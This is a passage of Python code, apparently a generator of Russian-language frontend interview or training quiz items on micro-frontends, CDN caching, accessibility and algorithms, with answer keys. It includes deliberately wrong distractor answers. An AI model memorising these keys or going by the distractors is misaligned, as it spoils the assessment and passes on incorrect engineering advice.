    opts, key = _options(rng, ["Общий слой серверного состояния с кэшем и дедупликацией (TanStack Query, SWR или свой загрузчик)",
                               "Запускать независимые запросы параллельно (Promise.all или загрузка на уровне маршрута)",
                               "Отдавать списку только нужные поля и страницами — пагинация на сервере"], v,
                         ["Перенести все запросы из useEffect в useLayoutEffect, чтобы они уходили раньше первой отрисовки",
                          "Хранить ответы API в localStorage без срока жизни и больше не запрашивать их повторно"])
    return {"scene_title": "Медленная загрузка", "story": story, "prompt": "Как исправить архитектурно?", "panel": {"type": "logs", "lines": lines}, "options": opts, "key": key}


@family("fe_arch_federation", "Frontend", "Архитектура клиента", "choice", 2.3, 2.2)
def _(rng):
    mf, widget = rng.choice([("checkout", "CartWidget"), ("loyalty", "BonusWidget"), ("support", "ChatWidget")])
    host_v, mf_v = rng.choice([("18.2.0", "18.3.1"), ("18.3.1", "18.2.0")])
    v = _variant(rng, 3)
    if v == 0:
        lines = [_log("Ср 15:02:11", "host", "INFO", f"loaded remote {mf}@https://static.example.local/{mf}/remoteEntry.js"),
                 _log("Ср 15:02:11", "build", "INFO", f"{mf} remoteEntry: bundled react@{mf_v}, react-dom@{mf_v} ({rng.randint(120, 160)} kB)"),
                 _log("Ср 15:02:12", "browser", "WARN", "Warning: Invalid hook call. Hooks can only be called inside of the body of a function component.\n"
                                                        "  3. You might have more than one copy of React in the same app"),
                 _log("Ср 15:02:12", "browser", "ERROR", f"TypeError: Cannot read properties of null (reading 'useState')\n    at {widget} ({mf}/src/{widget}.tsx:{rng.randint(8, 30)})"),
                 _log("Ср 15:02:12", "build", "INFO", f"host: react@{host_v}, ModuleFederationPlugin shared: {{}}")]
        story = f"Микрофронтенд {mf} соседней команды подключили к хосту через Module Federation. По отдельности оба работают, вместе {widget} падает."
    elif v == 1:
        lines = [_log("Ср 15:02:11", "host", "INFO", f"loaded remote {mf}@https://static.example.local/{mf}/remoteEntry.js"),
                 _log("Ср 15:02:12", "devtools", "INFO", f".btn {{ background: #ff5a00 }} — {mf}/styles.css (global) перекрывает host/ui-kit.css"),
                 _log("Ср 15:02:12", "devtools", "INFO", f"h2 {{ font-size: 28px }} — {mf}/styles.css (global)")]
        story = f"После подключения микрофронтенда {mf} у хоста поехали стили: все кнопки стали оранжевыми, заголовки — крупнее."
    else:
        lines = [_log("Ср 15:00:00", "deploy", "INFO", f"{mf}: new version deployed, old chunks removed from bucket"),
                 _log("Ср 15:02:11", "cdn", "INFO", f"GET /{mf}/remoteEntry.js 200 x-cache: HIT, cache-control: max-age=86400"),
                 _log("Ср 15:02:12", "browser", "ERROR", f"ChunkLoadError: Loading chunk {mf}_src_{widget}_tsx failed (404)")]
        story = f"После каждой выкладки {mf} у части пользователей {widget} не грузится до следующего дня."
    opts, key = _options(rng, [f"В хосте и в {mf} объявить react и react-dom общими singleton-зависимостями с совместимым диапазоном версий",
                               "Изолировать стили микрофронтенда: CSS Modules, префикс классов или Shadow DOM",
                               "remoteEntry.js отдавать без долгого кэша, а чанки с хешем в имени хранить и после выкладки"], v,
                         [f"Переписать {widget} на классовые компоненты: им хуки не нужны", "Включить React.StrictMode в хосте, чтобы найти побочные эффекты при рендере"])
    return {"scene_title": "Чужой виджет", "story": story, "prompt": "Что исправить?", "panel": {"type": "logs", "lines": lines}, "options": opts, "key": key}


@family("fe_arch_cdn_personal", "Frontend", "Архитектура клиента", "choice", 2.3, 2.4)
def _(rng):
    page, who, seen, n = rng.choice([("/catalog", "чужое имя пользователя", "видно", "7 минут"), ("/", "чужая корзина", "видна", "4 минуты"),
                                     ("/orders", "чужой номер телефона", "виден", "11 минут")])
    ttl = rng.choice([60, 120, 300])
    v = _variant(rng, 3)
    if v == 0:
        lines = [_log("10:41:02", "cdn-edge", "INFO", f"GET {page} 200 x-cache: HIT age={rng.randint(5, ttl - 1)}"),
                 _log("10:41:02", "cdn-edge", "INFO", f"response: cache-control: public, s-maxage={ttl}; vary: Accept-Encoding"),
                 _log("10:41:03", "web-ssr", "INFO", f"render {page} user=u_{rng.randint(1000, 9999)} stream=on 182 ms"),
                 _log("10:41:09", "support", "WARN", f"жалоба #{rng.randint(300, 900)}: в шапке {who}")]
        story = f"Чтобы выдержать распродажу, {page} начали кэшировать на CDN на {ttl} с. Нагрузка на сервер упала, но за {n} пришли жалобы: в шапке — {who}."
    elif v == 1:
        page = "/promo" if page == "/orders" else page
        lines = [_log("10:41:02", "cdn-edge", "INFO", f"GET {page} 200 x-cache: MISS"), _log("10:41:02", "cdn-edge", "INFO", f"response: cache-control: public, s-maxage={ttl}; vary: Cookie"),
                 _log("10:41:30", "cdn-edge", "INFO", f"hit ratio {page}: 0.{rng.randint(1, 9)} %, origin RPS без изменений")]
        story = (f"Чтобы выдержать распродажу, {page} начали кэшировать на CDN на {ttl} с. Персональных данных на странице нет, она одинакова для всех. "
                 "Нагрузка на сервер не изменилась.")
    else:
        lines = [_log("10:41:02", "cdn-edge", "INFO", f"GET {page}?page=3&sort=price 200 x-cache: HIT age={rng.randint(5, ttl - 1)}"),
                 _log("10:41:02", "cdn-edge", "INFO", "cache key: host + path (query string ignored)"),
                 _log("10:41:09", "support", "WARN", "жалоба: на любой странице каталога и при любой сортировке — одни и те же товары")]
        story = f"Чтобы выдержать распродажу, {page} начали кэшировать на CDN на {ttl} с. Нагрузка упала, но пагинация и сортировка перестали работать."
    opts, key = _options(rng, ["Персональная шапка попала в общий кэш: каркас — в CDN, персональный блок — отдельным запросом с Cache-Control: private",
                               "Vary: Cookie делает копию на каждого посетителя, и кэш не попадает: убрать Vary: Cookie из ответа",
                               "Ключ кэша не учитывает строку запроса: включить в него page и sort"], v,
                         [f"Снизить s-maxage до 5 секунд: окно, в котором {seen} {who}, станет пренебрежимым", "Выключить потоковый SSR: при стриминге ответы разных запросов смешиваются"])
    return {"scene_title": "Кэш на CDN", "story": story, "prompt": "Как исправить, сохранив выигрыш от кэша?", "panel": {"type": "logs", "lines": lines}, "options": opts, "key": key}


# --- Доступность ---


@family("fe_a11y_label", "Frontend", "Доступность", "mark", 2.1, -1.4)
def _(rng):
    form, typ, ph = rng.choice([("входа", "password", "Пароль"), ("заказа", "tel", "Телефон"), ("оплаты", "text", "Промокод")])
    v = _variant(rng, 3)
    lines = ['<form class="checkout">', '  <label for="email">Почта</label>', '  <input id="email" type="email" autocomplete="email">']
    if rng.random() < 0.5:
        lines.append('  <p class="hint">Пришлём на неё чек</p>')
    if v == 0:
        lines.append(f'  <input type="{typ}" placeholder="{ph}">')
        key = len(lines)
        story = f"Тестировщик проверяет форму {form} со скринридером. На одном из полей тот читает только «поле ввода», и непонятно, что вводить."
    else:
        lines += [f'  <label for="f2">{ph}</label>', f'  <input id="f2" type="{typ}">']
        if v == 1:
            num, spoken = rng.choice([(12, "двенадцать"), (24, "двадцать четыре"), (42, "сорок два"), (64, "шестьдесят четыре")])
            lines.append(f'  <a href="/help"><img src="/img/help-{num}.svg"></a>')
            key = len(lines)
            story = f"Тестировщик проверяет форму {form} со скринридером. На одной ссылке тот читает «ссылка, help тире {spoken} точка svg»."
        else:
            lines.append('  <div class="btn" onclick="submitForm()">Продолжить</div>')
            key = len(lines)
            story = f"Тестировщик проверяет форму {form} с клавиатуры: до кнопки «Продолжить» не добраться Tab, Enter её не нажимает."
    if v != 2:
        lines.append('  <button type="submit">Продолжить</button>')
    lines.append("</form>")
    return {"scene_title": "Форма со скринридером", "story": story, "prompt": "Нажмите на строку, которую нужно исправить.",
            "panel": {"type": "code", "lang": "html", "lines": lines}, "key": key}


@family("fe_a11y_modal", "Frontend", "Доступность", "choice", 2.2, 1.0)
def _(rng):
    title = rng.choice(["Удалить адрес?", "Подтвердите заказ", "Выход из аккаунта"])
    v = _variant(rng, 3)
    if v == 0:
        lang = "js"
        lines = ["function openModal() {", '  overlay.hidden = false;', '  modal.style.display = "block";', "}", "",
                 '<div class="overlay" hidden></div>', '<div class="modal">', f"  <h2>{title}</h2>",
                 '  <button class="btn">Да</button>', '  <button class="btn ghost">Отмена</button>', "</div>"]
        story = f"Окно «{title}» открывается по кнопке. С клавиатуры фокус остаётся на странице под окном, Tab ходит по ссылкам за подложкой, Esc ничего не делает."
    elif v == 1:
        lang = "css"
        lines = ["/* reset.css, подключён последним */", "*:focus {", "  outline: none;", "}"]
        story = "Пользователи, которые работают с клавиатуры, жалуются: непонятно, где сейчас фокус — Tab ходит по странице «вслепую»."
    else:
        lang = "html"
        lines = ['<div class="select" onclick="toggle()">Город доставки ▾</div>', '<ul class="options" hidden>',
                 '  <li onclick="pick(\'msk\')">Москва</li>', '  <li onclick="pick(\'spb\')">Санкт-Петербург</li>', "</ul>"]
        story = "Выбрать город доставки с клавиатуры невозможно: список не открывается, стрелки не работают, скринридер видит просто текст."
    opts, key = _options(rng, ["<dialog>.showModal() или вручную: фокус в окно, ловушка фокуса, Esc и возврат фокуса на кнопку",
                               "Вернуть видимый фокус: оформить :focus-visible, а не отключать outline у всех элементов",
                               "Нативный <select> или роль listbox с управлением стрелками и aria-activedescendant"], v,
                         ["Поднять z-index элемента выше всех на странице, тогда клавиатура до него доберётся",
                          "Добавить role=\"alert\" и aria-modal=\"true\": скринридер сам переведёт фокус, а браузер удержит Tab внутри"])
    return {"scene_title": "С клавиатуры", "story": story, "prompt": "Как исправить?", "panel": {"type": "code", "lang": lang, "lines": lines}, "options": opts, "key": key}


@family("fe_a11y_live", "Frontend", "Доступность", "choice", 2.2, 1.9)
def _(rng):
    comp, msg = rng.choice([("PaymentForm", "Карта отклонена банком"), ("SignupForm", "Эта почта уже занята"), ("PromoForm", "Промокод истёк")])
    v = _variant(rng, 3)
    if v == 0:
        lines = [f"function {comp}() {{", "  const [error, setError] = useState(null);", "  // submit() вызывает setError(текст) при ошибке сервера", "  return (",
                 "    <form onSubmit={submit}>", "      {/* … поля … */}", "      {error && (", '        <div role="status" aria-live="polite">{error}</div>', "      )}",
                 "    </form>", "  );", "}"]
        story = f"Ошибку «{msg}» видно на экране, но скринридер её не объявляет, хотя у контейнера стоит aria-live."
    elif v == 1:
        lines = ["function App() {", "  return (", "    <Router>", "      <Header />", "      <Routes>{/* … */}</Routes>", "    </Router>", "  );", "}",
                 "// при переходе по ссылке меняется только <main>, title и фокус остаются прежними"]
        story = "Пользователь скринридера нажимает на ссылку меню — и ничего не слышит: страница сменилась, а фокус остался на ссылке."
    else:
        lines = ['<button class="icon-btn">', '  <span class="icon icon-trash"></span>', "</button>",
                 '<span class="icon icon-star"></span> Избранное']
        story = "Кнопку удаления скринридер читает как «кнопка, private use символ E 0 1 2», а перед «Избранное» — ещё один непонятный символ."
    opts, key = _options(rng, ["Live-регион должен быть в DOM до изменения: рендерить контейнер всегда, менять только текст",
                               "При смене страницы переносить фокус на заголовок новой страницы и обновлять document.title",
                               "Декоративные иконки скрыть от скринридера aria-hidden=\"true\", смысловым дать текстовую подпись"], v,
                         ["Заменить polite на assertive: тогда объявление гарантировано в любом скринридере и при любом рендере",
                          "Добавить элементу tabindex=\"0\", чтобы скринридер его заметил"])
    return {"scene_title": "Скринридер молчит", "story": story, "prompt": "В чём причина и как исправить?", "panel": {"type": "code", "lang": "tsx", "lines": lines}, "options": opts, "key": key}


# --- Алгоритмы ---


@family("fe_alg_map", "Frontend", "Алгоритмы", "choice", 2.1, -1.2)
def _(rng):
    n, m = rng.randint(20, 90), rng.randint(5, 30)
    a, b, fk = rng.choice([("orders", "users", "userId"), ("tickets", "agents", "agentId"), ("payments", "merchants", "merchantId")])
    v = _variant(rng, 3)
    lines, story = [([f"const rows = {a}.map((x) => ({{", "  ...x,", f"  owner: {b}.find((y) => y.id === x.{fk}),", "}));"],
                     f"Таблица склеивает на клиенте {n} тыс. записей {a} и {m} тыс. записей {b}. Склейка идёт несколько секунд и вешает вкладку."),
                    (["const queue = [root];", "while (queue.length) {", "  const node = queue.shift();", "  visit(node);", "  queue.push(...node.children);", "}"],
                     f"Обход дерева комментариев на {n} тыс. узлов в ширину вешает вкладку на несколько секунд."),
                    (["socket.on('price', (p) => {", "  prices.push(p);", "  prices.sort((x, y) => x.value - y.value);", "  render(prices);", "});"],
                     f"Стакан цен держит {m} тыс. заявок отсортированными; на каждое обновление по сокету вкладка подтормаживает.")][v]
    opts, key = _options(rng, [f"Один раз собрать Map по id из {b} и брать из неё: O(n + m)",
                               "Очередь на индексе головы вместо shift(): shift сдвигает весь массив на каждом шаге",
                               "Вставлять новую заявку на место, найденное бинарным поиском, а не сортировать весь массив заново"], v,
                         ["Заменить find и shift на filter(...)[0]: на больших массивах он быстрее", "Переписать map на цикл for: основная потеря — в вызовах функций"])
    return {"scene_title": "Медленно в браузере", "story": story, "prompt": "Как ускорить?", "panel": {"type": "code", "lang": "ts", "lines": lines}, "options": opts, "key": key}


@family("fe_alg_tree_path", "Frontend", "Алгоритмы", "choice", 2.1, 0.3)
def _(rng):
    n = rng.choice([8, 15, 40])
    root, child, leaf = rng.choice([("Электроника", "Ноутбуки", "Игровые"), ("Дом", "Кухня", "Посуда"), ("Спорт", "Велосипеды", "Шоссейные")])
    i1, i2, i3 = rng.randint(1, 9), rng.randint(10, 99), rng.randint(100, 999)
    lines = ["[", f'  {{ "id": {i1}, "parentId": null, "name": "{root}" }},', f'  {{ "id": {i3}, "parentId": {i2}, "name": "{leaf}" }},',
             f'  {{ "id": {i2}, "parentId": {i1}, "name": "{child}" }},', "  …", "]"]
    v = _variant(rng, 3)
    story = ["Для «хлебных крошек» на каждой странице нужен путь от корня до текущей категории.",
             "Для меню нужно один раз построить из списка вложенное дерево категорий.",
             f"Фильтр «{child}» должен показывать товары из всех вложенных категорий любой глубины."][v]
    opts, key = _options(rng, ["Построить Map id → категория один раз и подниматься по parentId до корня: O(глубины)",
                               "Один проход: Map id → узел, затем каждый узел положить в children родителя: O(n)",
                               "Собрать потомков выбранной категории: Map parentId → дети и обход её поддерева, O(размера поддерева)"], v,
                         ["На каждом уровне заново фильтровать весь список по parentId: это O(log n)",
                          "Отсортировать категории по name и искать родителя каждого узла бинарным поиском: O(log n) на шаг"])
    return {"scene_title": "Дерево категорий", "story": f"API отдаёт {n} тыс. категорий плоским списком с parentId, порядок произвольный. {story}",
            "prompt": "Как это посчитать?", "panel": {"type": "code", "lang": "json", "lines": lines}, "options": opts, "key": key}


@family("fe_alg_virtual", "Frontend", "Алгоритмы", "choice", 2.2, 1.3)
def _(rng):
    n, what = rng.choice([50, 120, 300]), rng.choice(["сообщений", "событий", "комментариев"])
    hs = [rng.choice([40, 64, 96, 128, 220]) for _ in range(6)]
    h = rng.choice([40, 48, 56])
    v = _variant(rng, 3)
    if v == 2:
        lines = [f"// {n} тыс. строк, высота каждой — ровно {h} px", "", "function firstVisible(scrollTop: number): number {", "  // ?", "}"]
        story = f"Лента из {n} тыс. {what}, все строки одной высоты. На каждом кадре прокрутки нужно найти первую видимую строку по scrollTop."
    else:
        lines = [f"// {n} тыс. строк, высота каждой известна после измерения", f"const heights = [{', '.join(map(str, hs))}, …];",
                 "const offsets = prefixSums(heights); // offsets[i] — верх строки i, массив возрастает", "", "function firstVisible(scrollTop: number): number {", "  // ?", "}"]
        story = [f"Лента из {n} тыс. {what} с разной высотой строк. На каждом кадре прокрутки нужно найти первую видимую строку по scrollTop.",
                 f"Лента из {n} тыс. {what}: высоты меняются постоянно — раскрываются ответы, догружаются картинки. "
                 "Пересчёт offsets целиком после каждого изменения высоты тормозит прокрутку."][v]
    opts, key = _options(rng, ["Бинарный поиск по возрастающему offsets: последняя строка с offset ≤ scrollTop, O(log n) на кадр",
                               "Дерево Фенвика по высотам: изменение высоты и префиксная сумма за O(log n)",
                               f"Высоты равны: индекс = floor(scrollTop / {h}), O(1)"], v,
                         ["Идти от первой строки, суммируя высоты: на кадр это O(1)", "Хеш-таблица offset → индекс: поиск по любому scrollTop за O(1)"])
    return {"scene_title": "Виртуальный список", "story": story, "prompt": "Как реализовать?", "panel": {"type": "code", "lang": "ts", "lines": lines}, "options": opts, "key": key}
